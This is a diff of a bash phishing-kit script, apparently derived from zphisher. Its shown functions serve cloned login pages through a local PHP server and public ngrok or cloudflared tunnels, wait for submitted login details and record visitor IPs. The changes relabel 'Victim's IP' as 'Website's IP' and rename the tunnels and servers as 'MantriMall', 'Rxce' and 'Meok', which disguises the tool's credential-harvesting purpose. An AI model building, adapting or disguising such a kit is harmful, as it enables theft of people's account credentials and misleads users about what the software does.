@@ -166,17 +166,12 @@ banner() {
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}      ___           ___
-		${BLUE}     /\  \         /\  \  
-		${BLUE}    _\:\  \       /::\  \       ___           ___  
-		${BLUE}   /\ \:\  \     /:/\:\  \     /\__\         /\__\  
-                ${BLUE}  _\:\ \:\  \   /:/ /::\  \   /:/__/        /:/  /
-                ${BLUE} /\ \:\ \:\__\ /:/_/:/\:\__\ /::\  \       /:/__/
-                ${BLUE} \:\ \:\/:/  / \:\/:/  \/__/ \/\:\  \__   /::\  \
-                ${BLUE}   \:\/:/  /     \:\  \          \::/  / \/__\:\  \
-                ${BLUE}    \::/  /       \:\__\         /:/  /       \:\__\
-                ${BLUE}     \/__/         \/__/         \/__/         \/__/ 
-		${RED}                                                  Version :: 7.0
+		${BLUE} ____  ____  ___ __  __ _____           
+		${BLUE}|  _ \|  _ \|_ _|  \/  | ____|              
+		${BLUE}| |_) | |_) || || |\/| |  _|
+		${BLUE}|  __/|  _ < | || |  | | |___
+		${BLUE}|_|   |_| \_\___|_|  |_|_____|                                 
+		${RED}                                     ${RED}Version :: 7.0
 	EOF
 }
 
@@ -261,7 +256,7 @@ install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing MantriMall..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
@@ -281,7 +276,7 @@ install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Rxce..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
@@ -344,7 +339,7 @@ setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting Rxce server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
 
@@ -352,7 +347,7 @@ setup_site() {
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} VWebsite's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
 }
@@ -374,7 +369,7 @@ capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Website IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
@@ -392,7 +387,7 @@ capture_data() {
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Rxce..."
 
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
@@ -446,9 +441,9 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} ERROR.io     ${RED}[${CYAN}Buggy${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Rxce    ${RED}[${CYAN}For Devs${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Meok     ${RED}[${CYAN}Buggy${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} Mantrimall  ${RED}[${CYAN}NEW!${RED}]
 
 	EOF
 
